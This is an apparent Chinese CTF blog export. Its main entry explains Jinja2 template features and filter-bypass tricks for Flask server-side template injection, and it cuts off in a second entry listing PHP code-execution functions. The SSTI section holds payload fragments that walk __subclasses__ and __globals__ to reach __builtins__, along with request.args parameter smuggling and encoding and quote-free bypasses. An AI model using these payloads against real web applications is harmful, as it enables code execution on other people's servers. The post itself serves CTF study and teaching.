      <title>关于jinja2特性对ssti的bypass的影响</title>
      <link href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/"/>
      <url>/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/</url>
      
        <content type="html"><![CDATA[<p>之前写了一篇关于<a href="https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">python ssti</a>的文章,但在分析时过于肤浅地将重心放在python与flask上,从而完全忽视了对jinja2的深入探讨。实际上我们在flask中用<code>{ {</code>与<code>{ %</code>在进行执行python逃逸时并不是直接给python引擎处理,而是要先经过jinja2’渲染’一道.因此这是对之前不足的整理.<a id="more"></a></p><p><img src="image-20210113123904191.png" alt="image-20210113123904191"></p><h1 id="jinja2特性"><a href="#jinja2特性" class="headerlink" title="jinja2特性"></a>jinja2特性</h1><h2 id="变量属性"><a href="#变量属性" class="headerlink" title="变量属性"></a>变量属性</h2><p>在python中,我们常常是通过<code>.</code>来获取变量的属性的.例如<code>().__class__</code>.</p><p>但jinja2给我们提供了另外两种思路：<code>[]</code>与<code>|attr</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[]用法</span></span><br><span class="line">()[<span class="string">'__class__'</span>]</span><br><span class="line"><span class="comment">#|attr用法</span></span><br><span class="line">()|attr(<span class="string">'__class__'</span>)</span><br></pre></td></tr></table></figure><p>这里要值得注意的是纯python中<code>.</code>只有取对象属性的意思。但在jinja2下：`</p><p><code>xx.__class__</code>会先检测<code>x</code>对象有没有名为<code>__class__</code>的属性，若没会<strong>继续</strong>检测<code>xx</code>对象有没有名为<code>__class__</code>的这一项元素。如果没有，返回一个未定义对象。</p><p>但<code>xx[&#39;__class__&#39;]</code>确是：</p><p><code>xx[&#39;__class__&#39;]</code>会先检测<code>x</code>对象有没有名为<code>__class__</code>的这一项元素，若没会<strong>继续</strong>检测<code>xx</code>对象有没有名为<code>__class__</code>的这属性。如果没有，返回一个未定义对象。</p><p>而<code>xx|attr(&#39;__class__&#39;)</code>这个它只查找属性，如果没有返回一个未定义对象。</p><p>来举个栗子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#纯python交换行下</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">'pop'</span>:<span class="number">1</span>&#125;.pop</span><br><span class="line">&lt;built-<span class="keyword">in</span> method pop of dict object at <span class="number">0x000001A352BF8778</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;.po</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">'dict'</span> object has no attribute <span class="string">'po'</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#jinja2 中,xx.__class__ 式:</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'pop'</span>:<span class="string">'1'</span>&#125;.pop   &#125;&#125;</span><br><span class="line">&lt;built-<span class="keyword">in</span> method pop of dict object at <span class="number">0x7fbec74f0050</span>&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;.po  &#125;&#125;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="comment">#jinja2 中,xx['__class__'] 式:</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;<span class="string">'pop'</span>:<span class="string">'1'</span>&#125;[<span class="string">'pop'</span>]&#125;&#125;</span><br><span class="line"><span class="number">1</span> </span><br><span class="line">&#123;&#123;&#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;[<span class="string">'po'</span>]&#125;&#125;</span><br><span class="line"><span class="number">1</span> </span><br><span class="line"></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'pop'</span>:<span class="string">'1'</span>&#125;|attr(<span class="string">'pop'</span>)  &#125;&#125;</span><br><span class="line">     <span class="comment">#(一个未定义对象)</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method pop of dict object at <span class="number">0x7fbec74edd70</span>&gt; </span><br><span class="line">&#123;&#123;  &#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;|attr(<span class="string">'po'</span>)  &#125;&#125;</span><br><span class="line">     <span class="comment">#(一个未定义对象)</span></span><br></pre></td></tr></table></figure><h2 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h2><p>在jinji的渲染中，变量不能随意地被赋值。</p><p>变量赋值只能通过<code>{ % set x=xxx % }</code>来进行赋值，在<code>{ { } }</code>中只能使用变量而不能定义赋值变量。</p><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>在纯python中我们习惯用<code>+</code>来拼接字符串。</p><p>但在jinja2中我们还可以用<code>~</code>来拼接字符串。是<code>~</code>会把所有的操作数转换为字符串，并且连接它们。因此要注意的是：</p><p>1。操作数本来就是字符串，<code>~</code>会像<code>+</code>一样拼接它们。 </p><p><code>{ { &quot;Hello&quot; ~ &quot;name&quot; ~ &quot;!&quot; } }</code> 会返回： <code>Helloname!</code></p><p>2。若操作数是一个定义了且有值的变量名,<code>~</code>会用它的值来和其他字符串一起拼接。</p><p><code>Helloundefined!</code> 会返回（假设 name 值为 ‘lexsd6’ ）： <code>Hellolexsd6!</code></p><p>3。若操作数是一个定义了且为赋值或未定义的变量名,<code>~</code>会跳过ta用剩下的操作数来一起拼接。</p><p><code>{ { &quot;Hello&quot; ~ name ~ &quot;!&quot; } }</code> 会返回（假设 name  未定义 ）： <code>Hello!</code></p><p>4。若操作数是一个数字 or 元组 or 字典 or 列表 等常数 将直接转化为字符串来和其他操作数拼接。</p><p><code>{ { &quot;Hello&quot; ~ 1 ~ &quot;!&quot; } }</code> 会返回： <code>Hello1!</code></p><p><code>{ { &quot;Hello&quot; ~ (1,2) ~ &quot;!&quot; } }</code> 会返回： <code>Hello(1,2)!</code></p><p><code>{ { &quot;Hello&quot; ~ {1:2} ~ &quot;!&quot; } }</code> 会返回： <code>Hello{1,2}!</code></p><p><code>{ { &quot;Hello&quot; ~ [1,2] ~ &quot;!&quot; } }</code> 会返回： <code>Hello[1,2]!</code></p><h2 id="字符串转码"><a href="#字符串转码" class="headerlink" title="字符串转码"></a>字符串转码</h2><p>字符转码是一个web模板常有的东西。但通常都是url编码的转化。</p><p>但在jinja2中，还可以自动将16进制，8进制，unicode编码的字符串转码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># \xXX</span></span><br><span class="line"><span class="string">'\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F'</span> ==<span class="string">'__class__'</span></span><br><span class="line"><span class="comment">#\000</span></span><br><span class="line"><span class="string">'\137\137\143\154\141\163\163\137\137'</span>==<span class="string">'__class__'</span></span><br><span class="line"><span class="comment">#\uXXX</span></span><br><span class="line"><span class="string">'\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F'</span>==<span class="string">'__class__'</span></span><br><span class="line"><span class="comment">#\uXXXXXXXX</span></span><br><span class="line"><span class="string">'\U0000005F\U0000005F\U00000063\U0000006C\U00000061\U00000073\U00000073\U0000005F\U0000005F'</span>==<span class="string">'__class__'</span></span><br></pre></td></tr></table></figure><h2 id="过滤器机制"><a href="#过滤器机制" class="headerlink" title="过滤器机制"></a>过滤器机制</h2><p>在jinji2中有一种独特的调用机制,这种机制本意是用来对<code>{ {</code>与<code>{ %</code>中的数据进行筛选或类型转化的. 过滤器通过<code>|</code>来调用它们.例如<code>|attr()</code>就是一个典型的过滤器.</p><h3 id="attr"><a href="#attr" class="headerlink" title="|attr"></a>|attr</h3><p>之前已经说过，这是对 ‘对象’ 取属性的 过滤器。这里再强调下<code>|attr</code><strong>只查找属性</strong>.</p><h3 id="float"><a href="#float" class="headerlink" title="|float"></a>|float</h3><p>若在<code>|</code>对对象是纯数字的字符串前将非浮点数型的数字字符则将其转化为浮点数.否则将括号类的字符转换为浮点型(若没有参数返回<code>0.0</code>).同时<code>|</code>符合要求时括号可以简写.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'1'</span>|float()  <span class="comment"># 1.0</span></span><br><span class="line"><span class="string">'1'</span>|float  <span class="comment"># 1.0</span></span><br><span class="line"><span class="number">1</span>|float()  <span class="comment"># 1.0</span></span><br><span class="line"><span class="number">1</span>|float  <span class="comment"># 1.0</span></span><br><span class="line">[<span class="number">1</span>]|float(<span class="number">1</span>) <span class="comment">#1.0</span></span><br><span class="line">[<span class="number">1</span>]|float() <span class="comment">#0.0</span></span><br><span class="line">[<span class="number">1</span>]|float <span class="comment">#0.0</span></span><br></pre></td></tr></table></figure><h3 id="format"><a href="#format" class="headerlink" title="|format"></a>|format</h3><p>纯python中format在jinja中同样可以但jinjia提供格外的<code>|format</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">"%s - %s"</span>|format(<span class="string">"lexs"</span>, <span class="string">"d6!"</span>) &#125;&#125; <span class="comment">#lexs-d6!</span></span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="|join"></a>|join</h3><p>返回一个字符串，该字符串是序列中字符串的串联。元素之间的分隔符默认为空字符串，可以使用可选参数定义字符串。(ps:如果对象是字典，则只拼接 <strong>键</strong> )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="string">'a'</span>,b]|join&#125;&#125; <span class="comment">#1a</span></span><br><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="string">'a'</span>,b]|join(<span class="number">3</span>)&#125;&#125; <span class="comment">#13a3</span></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>&#125;|join&#125;&#125; <span class="comment">#ab</span></span><br></pre></td></tr></table></figure><h3 id="last"><a href="#last" class="headerlink" title="|last"></a>|last</h3><p>取一个字符串，元组，列表的最后一项。（高版本的字典不行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'1234'</span>|last()&#125;&#125;<span class="comment">#4</span></span><br><span class="line">&#123;&#123;(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)|last()&#125;&#125; <span class="comment">#4</span></span><br><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]|last()&#125;&#125;<span class="comment">#4</span></span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="|list"></a>|list</h3><p>将值转换为列表.如果是字符串，则返回的列表将是字符列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,%<span class="number">27</span>a%<span class="number">27</span>,b|list <span class="comment">#(1, 'a', [])</span></span><br><span class="line">&#123;&#123;<span class="string">'abc'</span>|list&#125;&#125; <span class="comment">#['a', 'b', 'c']</span></span><br></pre></td></tr></table></figure><h3 id="lower"><a href="#lower" class="headerlink" title="|lower"></a>|lower</h3><p>将大写字母转换为小写字母.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'ＣＬＡＳＳ'</span>|lower()&#125;&#125; <span class="comment">#ｃｌａｓｓ</span></span><br></pre></td></tr></table></figure><h3 id="string"><a href="#string" class="headerlink" title="|string"></a>|string</h3><p>如果对象不是字符串则转换为字符串.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>|string&#125;&#125; <span class="comment"># (1, 2, 3, '4')</span></span><br></pre></td></tr></table></figure><h3 id="replace"><a href="#replace" class="headerlink" title="|replace"></a>|replace</h3><p>对对象中出现的字符串进行替代。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'fl4g'</span>|replace(<span class="string">'4'</span>,<span class="string">'a'</span>)&#125;&#125; <span class="comment">#flag</span></span><br></pre></td></tr></table></figure><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><p>在jinja的<code>{ {</code>与<code>{ %</code>中虽然环境中其实也有全局函数存在的。</p><p>如range，lipsum，dict，cycler，reset，next，current，joiner。</p><p>这些函数大多用法和纯python差不多，而且是以<strong>类</strong>来定义，在ssti中大多都是<code>xxx.__class__</code>工具人。但要提下<strong>dict</strong>。</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>在jinja2中 {‘foo’ : ‘bar’} 与 dict(foo=bar) 等价。(凭空生字符串)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;dict(lexs=<span class="number">0</span>)&#125;&#125; <span class="comment">#  &#123;'lexs': 0&#125;</span></span><br></pre></td></tr></table></figure><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h3 id="参数关键词字符过滤"><a href="#参数关键词字符过滤" class="headerlink" title="参数关键词字符过滤"></a>参数关键词字符过滤</h3><h4 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h4><p>利用<code>+</code>与<code>~</code>来进行字符串拼接操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'__clas'</span>+<span class="string">'s__'</span></span><br><span class="line"><span class="string">'__clas'</span>~<span class="string">'s__'</span></span><br></pre></td></tr></table></figure><h4 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h4><p>用|replace来替换关键字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'fl4g'</span>|replace(<span class="string">'4'</span>,<span class="string">'a'</span>)&#125;&#125; <span class="comment">#flag</span></span><br></pre></td></tr></table></figure><h4 id="进行decode解编码绕过"><a href="#进行decode解编码绕过" class="headerlink" title="进行decode解编码绕过"></a>进行decode解编码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64 decode解编码</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'X19jbGFzc19f'</span>.decode(<span class="string">'base64'</span>)] <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#hex decode解编码</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'5f5f636c6173735f5f'</span>.decode(<span class="string">'hex'</span>)]<span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#rot13 decode解编码</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'__pynff__'</span>.decode(<span class="string">'rot13'</span>)]<span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><h4 id="利用-string转化字符拼接绕过"><a href="#利用-string转化字符拼接绕过" class="headerlink" title="利用|string转化字符拼接绕过"></a>利用|string转化字符拼接绕过</h4><p>利用<code>|string</code>会对象转为字符串的特性。将一些内置对象转为字符串来拼接绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(x|select|string)[<span class="number">24</span>]~(x|select|string)[<span class="number">24</span>]~(x|select|string)[<span class="number">15</span>]~(x|select|string)[<span class="number">20</span>]~(x|select|string)[<span class="number">6</span>]~(x|select|string)[<span class="number">18</span>]~(x|select|string)[<span class="number">18</span>]~(x|select|string)[<span class="number">24</span>]~(x|select|string)[<span class="number">24</span>]&#125;&#125;<span class="comment">#__class__</span></span><br></pre></td></tr></table></figure><h4 id="利用-join来提取"><a href="#利用-join来提取" class="headerlink" title="利用|join来提取"></a>利用|join来提取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;  [<span class="string">'f'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'g'</span>]|join()    &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="利用request-args，request-values进行传参"><a href="#利用request-args，request-values进行传参" class="headerlink" title="利用request.args，request.values进行传参"></a>利用request.args，request.values进行传参</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request.args.class][request.args.x1][request.args.x2][request.args.x3]()[40]&#125;&#125;?class=__class__&amp;x1=__base__&amp;x2=__base__&amp;x3=__subclasses__</span><br><span class="line"><span class="comment">#若’.’也被过滤可以用’[]’套娃方式代替</span></span><br><span class="line">&#123;&#123;""[request['args']['c']]&#125;&#125;?c=__class__</span><br></pre></td></tr></table></figure><h4 id="利用模板渲染编码绕过：（部分新版本）"><a href="#利用模板渲染编码绕过：（部分新版本）" class="headerlink" title="利用模板渲染编码绕过：（部分新版本）"></a>利用模板渲染编码绕过：（部分新版本）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#16进制（\xXX）绕过。</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#8进制（\OOO）绕过。</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'\137\137\143\154\141\163\163\137\137'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#unicode（\uXXXXor\UXXXXXXXX）绕过。</span></span><br><span class="line"><span class="comment">#\uX<span class="doctag">XXX:</span></span></span><br><span class="line">    <span class="string">''</span>[<span class="string">'\137\137\143\154\141\163\163\137\137'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#\UXXXXX<span class="doctag">XXX:</span></span></span><br><span class="line">    <span class="string">''</span>[<span class="string">'\U0000005F\U0000005F\U00000063\U0000006C\U00000061\U00000073\U00000073\U0000005F\U0000005F'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><h3 id="引号被过滤"><a href="#引号被过滤" class="headerlink" title="引号被过滤"></a>引号被过滤</h3><h4 id="dict-与-jion配合"><a href="#dict-与-jion配合" class="headerlink" title="dict 与|jion配合"></a>dict 与|jion配合</h4><p>利用在jinja中dict会将键名转化字符串，再利用|jion作用时只拼接键值的特性绕过。（ps：注意键值唯一！）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(dict(c=<span class="number">1</span>,l=<span class="number">1</span>,a=<span class="number">1</span>,s=<span class="number">1</span>)|join)~(dict(s=<span class="number">1</span>)|join)&#125;&#125;<span class="comment">#class</span></span><br></pre></td></tr></table></figure><h4 id="dict-与-list-、-last配合"><a href="#dict-与-list-、-last配合" class="headerlink" title="dict 与|list 、|last配合"></a>dict 与|list 、|last配合</h4><p>利用dict 构照字典再list转列表提取key值再用last取之。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;dict(a=<span class="number">1</span>)|list|last&#125;&#125; <span class="comment">#a</span></span><br></pre></td></tr></table></figure><h4 id="jion与字符串切片提取键值"><a href="#jion与字符串切片提取键值" class="headerlink" title="|jion与字符串切片提取键值"></a>|jion与字符串切片提取键值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|join)[<span class="number">62</span>:<span class="number">74</span>] <span class="comment">## #|jion 提取 __builtins__</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__)[(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|join)[<span class="number">62</span>:<span class="number">74</span>]]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="list提取字典键值"><a href="#list提取字典键值" class="headerlink" title="|list提取字典键值"></a>|list提取字典键值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># |list 的作用是字典时会只将字典键值作为转为字符串列表</span></span><br><span class="line"><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|list)[<span class="number">7</span>] </span><br><span class="line"><span class="comment"># __builtins__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__[(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|list)[<span class="number">7</span>]]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="string-转化出字符拼接"><a href="#string-转化出字符拼接" class="headerlink" title="string 转化出字符拼接"></a>string 转化出字符拼接</h4><p>|string将非字符转化为字符的功能很强大,也可以用转化对象来拼字符.</p><h3 id="被过滤"><a href="#被过滤" class="headerlink" title="[]被过滤"></a><code>[]</code>被过滤</h3><h4 id="取属性"><a href="#取属性" class="headerlink" title="取属性"></a>取属性</h4><p>用|attr或 <code>.</code>来代替。</p><h4 id="对字典操作"><a href="#对字典操作" class="headerlink" title="对字典操作"></a>对字典操作</h4><p>pop方法(会删除改变字典)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>&#125;.pop(<span class="string">'b'</span>)&#125;&#125; <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>get方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>&#125;.get(<span class="string">'b'</span>)&#125;&#125; <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>setdefault方法(注意若字典里原本不纯在该键值会添加键值)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>&#125;.setdefault(<span class="string">'b'</span>)&#125;&#125; <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p><code>__getitem__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#39;a&#39;:1,&#39;b&#39;:2&#125;.__getitem__(&#39;b&#39;)&#125;&#125; #2</span><br></pre></td></tr></table></figure><h4 id="对列表操作"><a href="#对列表操作" class="headerlink" title="对列表操作"></a>对列表操作</h4><p>pop函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].pop(<span class="number">1</span>)&#125;&#125; <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p><code>__getitem__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].__getitem__(<span class="number">1</span>)&#125;&#125;<span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>last</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]|last()&#125;&#125;<span class="comment">#3</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://docs.jinkan.org/docs/jinja2/templates.html" target="_blank" rel="noopener">http://docs.jinkan.org/docs/jinja2/templates.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php执行与文件系统处理函数整理</title>
      <link href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/"/>
      <url>/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>最近难得有空将php中执行与文件系统处理相关常见的函数给总结一下吧。(顺便加强下记忆)</p><a id="more"></a><h2 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数"></a>php代码执行函数</h2><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>把字符串作为PHP代码执行(因为是一个语言构造器而不是一个函数，不能被可变函数调用。)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="keyword">eval</span>(<span class="string">'code'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>把字符串作为PHP代码执行,在php7是一个可变函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php assert(<span class="string">'code'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p>preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码。（PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    preg_replace(<span class="string">"/abc/e"</span>,<span class="string">'code'</span>,<span class="string">"php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>create_function —创建一个匿名（lambda样式）函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 